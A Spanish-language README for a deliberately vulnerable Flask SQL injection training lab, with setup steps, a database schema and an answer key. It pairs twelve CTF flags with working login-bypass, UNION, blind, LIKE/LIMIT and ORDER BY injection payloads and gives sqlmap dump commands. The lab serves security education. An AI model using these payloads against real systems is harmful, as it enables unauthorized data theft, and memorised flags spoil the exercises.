# VulnMachine – SQL Injection Lab

> Plataforma de entrenamiento en seguridad ofensiva inspirada en Metasploitable2.  
> **Solo para uso educativo en entornos aislados.**

---

## 🚀 Instalación y arranque

```bash
# 1. Instalar dependencias
pip3 install flask

# 2. Crear la base de datos
python3 setup_db.py

# 3. Iniciar el servidor (accesible desde red)
python3 app.py
```

El servidor escucha en `0.0.0.0:5000`. Desde Kali Linux accede a:
```
http://192.168.56.101:5000
```

---

## 🏁 Las 12 Banderas

### Challenge 1 – Login Bypass

| Flag | Nivel | Payload |
|------|-------|---------|
| `FLAG{1A_4dm1n_bypass_sqli_b4sic}` | Básico | `usuario: admin'--` o `' OR '1'='1'--` |
| `FLAG{1B_w4f_bypass_case_OR_1=1}` | WAF | `usuario: ' OR '1'='1'--` (con OR mayúscula) |

### Challenge 2 – Error-Based / UNION

| Flag | Nivel | Payload |
|------|-------|---------|
| `FLAG{2A_err0r_based_data_exfil}` | 1 | `?id=0 UNION SELECT 1,secret_flag,3,4,5,6,7 FROM products WHERE id=3--` |
| `FLAG{2B_un10n_s3lect_s3cret_t4ble}` | 2 | `?id=1 UNION SELECT 1,secret_flag,3,4,5,6,7 FROM products WHERE id=6--` (con espacio al inicio) |

> **Nota:** La tabla `products` tiene **7 columnas**: id, name, description, category, price, stock, secret_flag

### Challenge 3 – UNION en categoría

| Flag | Nivel | Payload |
|------|-------|---------|
| `FLAG{3A_un10n_s3lect_3cols_nailed}` | 1 | `?q=x' UNION SELECT 1,flag,name FROM secret_flags--` |
| `FLAG{3B_qu0te_escape_bypass_via_enc0ding}` | 2 | `?q=x'' UNION SELECT 1,secret_flag,3 FROM products WHERE id=8--` |

### Challenge 4 – Blind Boolean

| Flag | Nivel | Payload |
|------|-------|---------|
| `FLAG{4A_bl1nd_bool_sqli_tr00}` | 1 | `?id=6` (usuario superuser tiene la flag en su secret) |
| `FLAG{4B_bl1nd_b00l_t1me_b4sed}` | 2 | `?id=7` (usuario guest) — usar sqlmap para extraer |

**sqlmap automático:**
```bash
sqlmap -u "http://192.168.56.101:5000/challenge/4/level1?id=1" \
       --dbs --dump --level=3 --risk=2 --batch
```

### Challenge 5 – LIKE / LIMIT Injection

| Flag | Nivel | Payload |
|------|-------|---------|
| `FLAG{5A_lik3_cl4us3_sqli_pwned}` | 1 | `?search=%' UNION SELECT 1,secret_flag,description,price FROM products WHERE id=9--` |
| `FLAG{5B_l1m1t_param_sqli_bypass}` | 2 | `?search=a&limit=5 UNION SELECT 1,secret_flag,description,price FROM products WHERE id=10--` |

### Challenge 6 – ORDER BY / Column Injection

| Flag | Nivel | Payload |
|------|-------|---------|
| `FLAG{6A_0rder_by_sqli_c4se_when}` | 1 | `?sort=(SELECT secret_flag FROM products WHERE id=11)` |
| `FLAG{6B_c0l_subquery_m4ster}` | 2 | `?sort=id&col=(SELECT secret_flag FROM products WHERE id=12)` |

---

## 🔧 Herramientas recomendadas (Kali Linux)

```bash
# sqlmap básico
sqlmap -u "http://IP:5000/ruta?param=valor" --dbs

# sqlmap con dump completo
sqlmap -u "http://IP:5000/challenge/2/level1?id=1" \
       --dump-all --batch --level=5 --risk=3

# curl manual
curl "http://IP:5000/challenge/2/level1?id=0%20UNION%20SELECT%201,secret_flag,3,4,5,6,7%20FROM%20products--"

# Burp Suite
# Proxy → Intercept → Send to Repeater → Modificar parámetros
```

---

## 🗄️ Estructura de la base de datos

```
users         → id, username, password, role, email, secret
products      → id, name, description, category, price, stock, secret_flag  (7 cols)
secret_flags  → id, name, flag
```

---

## 📁 Estructura del proyecto

```
.
├── app.py           ← Aplicación Flask principal
├── setup_db.py      ← Crea la base de datos
├── vulnerable.db    ← Base de datos SQLite (generada)
└── templates/
    ├── base.html
    ├── index.html
    ├── challenge1-6.html
    ├── c1_level1/2.html
    ├── c2_level1/2.html
    ├── c3_level1/2.html
    ├── c4_level1/2.html
    ├── c5_level1/2.html
    ├── c6_level1/2.html
    └── scoreboard.html
```

---

⚠️ **ADVERTENCIA**: Este laboratorio es intencionalmente vulnerable.  
Úsalo únicamente en redes aisladas (host-only adapter en VirtualBox).  
No expongas este servidor a internet.
